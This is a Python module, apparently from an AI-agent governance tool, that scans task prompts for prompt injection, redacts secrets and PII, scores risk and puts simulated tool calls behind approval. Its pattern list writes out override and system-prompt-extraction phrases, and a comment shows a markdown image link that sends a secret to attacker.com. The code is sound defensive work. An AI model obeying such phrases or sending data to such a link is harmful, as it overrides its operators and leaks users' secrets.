from __future__ import annotations
import re
from typing import Any
from .models import AgentProfile, ToolConnector, ToolCall, RiskFlag, PolicyRule

# Patterns to scan for prompt injections and jailbreaks
INJECTION_PAYLOADS = [
    (r"ignore\s+(?:previous|all)?\s*instructions", "Instruction override attempt"),
    (r"reveal\s+(?:your|the)?\s*system\s*prompt", "System prompt exposure attempt"),
    (r"disable\s+(?:safety|policy|policies|rules)", "Safety bypass attempt"),
    (r"bypass\s+(?:approval|gate|guard)", "Approval bypass attempt"),
    (r"send\s+data\s+to\s+https?://", "Potential unauthorized data exfiltration"),
    (r"override\s+developer\s+instructions", "Instruction override attempt"),
    (r"summarize\s+confidential\s+files\s+and\s+email", "Sensitive data exfiltration attempt"),
    (r"use\s+hidden\s+credentials", "Credential access attempt"),
    (r"dump\s+credentials", "Credential dumping attempt"),
    (r"exfiltrate", "Data exfiltration attempt"),
    (r"ignore\s+all\s+policies", "Policy bypass attempt"),
    (r"markdown\s+link\s+leak", "Link-based exfiltration attempt"),
    (r"system\s*prompt\s*summary", "System prompt extraction attempt")
]

PII_PATTERNS = {
    "SSN": r"\b\d{3}-\d{2}-\d{4}\b",
    "Email": r"\b[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}\b",
    "Phone": r"\b(?:\+?\d{1,3}[ -]?)?\(?\d{3}\)?[ -]?\d{3}[ -]?\d{4}\b"
}

SECRET_PATTERNS = {
    "Generic API Key/Secret": r"(?:api[_-]?key|apikey|secret|password|passwd|token|private[_-]?key)\s*[:=]\s*[\"']?[A-Za-z0-9+/=]{16,}[\"']?",
    "OpenAI Key": r"\bsk-[a-zA-Z0-9]{32,}\b",
    "Gemini Key": r"\bAIzaSy[a-zA-Z0-9_-]{33}\b",
    "Slack Webhook": r"https://hooks\.slack\.com/services/[T|B][A-Za-z0-9]{8}/[B][A-Za-z0-9]{8}/[A-Za-z0-9]{24}"
}

DESTRUCTIVE_WORDS = ['delete', 'drop', 'truncate', 'overwrite', 'remove all', 'production', 'prod database', 'rm -rf']
EXTERNAL_WORDS = ['send email', 'email', 'slack', 'post', 'notify', 'message customer', 'outreach', 'webhook']
FINANCIAL_LEGAL_WORDS = ['legal', 'lawsuit', 'contract', 'investment decision', 'financial advice', 'acquisition decision']


def scan_prompt_for_injection(prompt: str) -> dict[str, Any]:
    """
    Dedicated prompt-injection scanner.
    Returns details on matches, scores, and suggests actions.
    """
    text = prompt.lower()
    matches = []
    score = 0.0

    # 1. Regex rule checks
    for pattern, reason in INJECTION_PAYLOADS:
        if re.search(pattern, text, re.IGNORECASE):
            matches.append({"pattern": pattern, "category": "prompt_injection", "reason": reason})
            # Critical overrides are blocked automatically
            if any(x in pattern for x in ["ignore", "reveal", "disable", "bypass", "override"]):
                score += 0.60
            else:
                score += 0.35

    # 2. Suspicious Markdown link check (used for prompt injection data exfiltration)
    # e.g. ![leak](http://attacker.com/log?leak=[SECRET])
    markdown_link_exfil = re.search(r"!\[.*?\]\((https?://[^\s)]+)\)", prompt)
    if markdown_link_exfil:
        matches.append({
            "pattern": r"!\[.*?\]\(https?://...\)",
            "category": "data_exfiltration",
            "reason": f"Suspicious markdown image link to external URL: {markdown_link_exfil.group(1)}"
        })
        score += 0.45

    # 3. Hidden instructions check (e.g. text containing repetitive whitespace or zero-width chars)
    if "\u200b" in prompt or "\u200c" in prompt:
        matches.append({"pattern": "unicode_zero_width", "category": "obfuscation", "reason": "Zero-width space obfuscation detected"})
        score += 0.25

    score = min(1.0, score)
    return {
        "is_injection": len(matches) > 0,
        "score": int(score * 100),
        "matches": matches,
        "suggested_action": "block" if score >= 0.6 else "require_review" if len(matches) > 0 else "allow"
    }


def redact_secrets_and_pii(text: str) -> str:
    """
    Redact PII and API keys from any input or tool outputs before entering LLM context.
    """
    redacted = text
    # Redact Secrets
    for name, pattern in SECRET_PATTERNS.items():
        redacted = re.sub(pattern, f"[REDACTED {name.upper()}]", redacted, flags=re.IGNORECASE)
    # Redact PII
    for name, pattern in PII_PATTERNS.items():
        redacted = re.sub(pattern, f"[REDACTED {name.upper()}]", redacted, flags=re.IGNORECASE)
    return redacted


def assess_task_risk(task: str, policies: list[PolicyRule]) -> tuple[int, list[RiskFlag]]:
    """
    Assess task risk dynamically based on configured policies, injections, PII, and credentials.
    """
    text = task.lower()
    flags: list[RiskFlag] = []

    # 1. Scan for prompt injections
    inj_result = scan_prompt_for_injection(task)
    if inj_result["is_injection"]:
        severity = "critical" if inj_result["score"] >= 60 else "high"
        for match in inj_result["matches"]:
            flags.append(RiskFlag(
                severity=severity,
                category=match["category"],
                message=f"Prompt injection / security risk detected: {match['reason']}",
                evidence=match["pattern"]
            ))

    # 2. Scan for secrets exposure
    for name, pattern in SECRET_PATTERNS.items():
        match = re.search(pattern, task, re.IGNORECASE)
        if match:
            flags.append(RiskFlag(
                severity="critical",
                category="secret_leakage",
                message=f"Critical API Key or Secret exposed: {name}",
                evidence=match.group(0)[:8] + "..."
            ))

    # 3. Scan for PII exposure
    for name, pattern in PII_PATTERNS.items():
        match = re.search(pattern, task, re.IGNORECASE)
        if match:
            flags.append(RiskFlag(
                severity="high",
                category="pii_leakage",
                message=f"Personal Identifiable Information detected: {name}",
                evidence=match.group(0)
            ))

    # 4. Destructive command checks
    if any(w in text for w in DESTRUCTIVE_WORDS):
        flags.append(RiskFlag(
            severity="critical",
            category="destructive_action",
            message="Task may involve destructive or production-altering actions (e.g. delete/drop/rm -rf).",
            evidence=task[:240]
        ))

    # 5. External communication checks
    if any(w in text for w in EXTERNAL_WORDS):
        flags.append(RiskFlag(
            severity="medium",
            category="external_communication",
            message="Task involves sending or publishing notifications or messages to external channels.",
            evidence=task[:240]
        ))

    # 6. Financial/legal checks
    if any(w in text for w in FINANCIAL_LEGAL_WORDS):
        flags.append(RiskFlag(
            severity="high",
            category="financial_or_legal",
            message="Task involves financial or legal decisions requiring mandatory reviewer audit.",
            evidence=task[:240]
        ))

    # 7. Check against custom database policy rule conditions
    # e.g., if a policy says 'block destructive tools' or 'require approval for emails'
    for policy in policies:
        if not policy.enabled:
            continue
        # Check condition as a simple text matching check
        cond = policy.condition.lower()
        if cond in text:
            flags.append(RiskFlag(
                severity=policy.severity,
                category="policy_rule_violation",
                message=f"Custom policy rule violation: {policy.name} ({policy.description})",
                evidence=policy.condition
            ))

    # Calculate overall risk score
    score = 0
    weights = {'low': 10, 'medium': 25, 'high': 55, 'critical': 85}
    for f in flags:
        score = max(score, weights.get(f.severity, 25))
    
    if len(flags) > 2:
        score = min(100, score + 15)
        
    return score, flags


def infer_intent(task: str) -> str:
    t = task.lower()
    if any(x in t for x in ['email', 'reply', 'customer', 'support', 'refund']):
        return 'customer_support_or_communication'
    if any(x in t for x in ['github', 'jira', 'bug', 'issue', 'pull request', 'ci']):
        return 'engineering_workflow'
    if any(x in t for x in ['sql', 'database', 'query', 'churn', 'revenue', 'table']):
        return 'data_analysis'
    if any(x in t for x in ['compliance', 'soc2', 'iso', 'gdpr', 'audit', 'evidence']):
        return 'compliance_review'
    if any(x in t for x in ['lead', 'crm', 'outreach', 'permit', 'business']):
        return 'lead_intelligence'
    return 'general_agent_task'


def _actual_tool(c: ToolConnector) -> str:
    return c.real_connector or c.tool_name


def plan_tool_calls(task: str, agent: AgentProfile, connectors: list[ToolConnector]) -> list[ToolCall]:
    connector_map = {_actual_tool(c): c for c in connectors if c.enabled}
    allowed = set(agent.allowed_tools)
    t = task.lower()
    candidates: list[str] = []
    
    if any(x in t for x in ['email', 'reply', 'outreach', 'customer']): 
        candidates.append('gmail.send_email')
    if any(x in t for x in ['slack', 'notify', 'channel', 'team']): 
        candidates.append('slack.notify')
    if any(x in t for x in ['github', 'repo', 'issue', 'pull request', 'ci']): 
        candidates.append('github.create_issue')
    if any(x in t for x in ['jira', 'ticket', 'bug', 'task']): 
        candidates.append('jira.create_ticket')
    if any(x in t for x in ['sql', 'database', 'query']): 
        candidates.append('database.query')
    if 'snowflake' in t: 
        candidates.append('snowflake.query')
    if any(x in t for x in ['fetch', 'url', 'website', 'browser']): 
        candidates.append('browser.fetch')
    if any(x in t for x in ['crm', 'lead']): 
        candidates.append('crm.create_lead')
    if 'hubspot' in t: 
        candidates.append('hubspot.create_contact')
    if any(x in t for x in ['drive', 'document', 'evidence']): 
        candidates.append('google_drive.search')
    if any(x in t for x in ['zendesk', 'support ticket']): 
        candidates.append('zendesk.create_ticket')
    if any(x in t for x in ['report', 'write file', 'export']): 
        candidates.append('file.write')
        
    if not candidates: 
        candidates = ['knowledge.search']

    calls = []
    for tool_name in candidates:
        c = connector_map.get(tool_name)
        if not c:
            continue
        
        allowed_for_agent = tool_name in allowed
        # Build base arguments
        args = {'task_summary': task[:500], 'simulated': True}
        if tool_name == 'gmail.send_email': 
            args.update({'to': 'customer@example.com', 'subject': 'AgentOps Guard Reply', 'body': 'Dear Customer, your ticket has been received.'})
        elif tool_name == 'slack.notify': 
            args.update({'channel': '#agentops-feed', 'message': f"Governed Alert: {task[:200]}"})
        elif tool_name in {'database.query', 'snowflake.query'}: 
            # Check for possible injections in the planned database query
            query_stmt = 'SELECT * FROM users LIMIT 5;'
            if "delete" in t or "drop" in t or "truncate" in t:
                query_stmt = f"-- BLOCKED unsafe action statement --\n{task[:100]}"
            args.update({'query': query_stmt})
        elif tool_name in {'github.create_issue', 'jira.create_ticket'}: 
            args.update({'title': f"Governed Alert: {task[:50]}", 'description': task[:300]})
        elif tool_name in {'crm.create_lead', 'hubspot.create_contact'}: 
            args.update({'lead_name': 'New Governed Lead', 'source': 'AgentOps Guard Auto-detection'})
            
        # Approval condition:
        # A tool call requires approval if:
        # 1. The connector demands approval (`c.requires_approval`) OR
        # 2. The tool is NOT in the allowed list of this agent (`not allowed_for_agent`) OR
        # 3. The tool's risk level is high or critical
        requires_approval = bool(c.requires_approval or (not allowed_for_agent) or (c.risk_level in {"high", "critical"}))
        status = 'pending' if requires_approval else 'not_required'
        
        calls.append(ToolCall(
            tool_name=tool_name,
            arguments=args,
            risk_level=c.risk_level,
            requires_approval=requires_approval,
            status=status
        ))
    return calls


def policy_check_tool_calls(tool_calls: list[ToolCall], task_risk_score: int) -> list[ToolCall]:
    for call in tool_calls:
        if call.risk_level in {'high', 'critical'}:
            call.requires_approval = True
            call.status = 'pending'
        if task_risk_score >= 80:
            call.requires_approval = True
            call.status = 'blocked'
            call.result = 'Blocked: Overall agent run risk score is critical (>=80).'
    return tool_calls
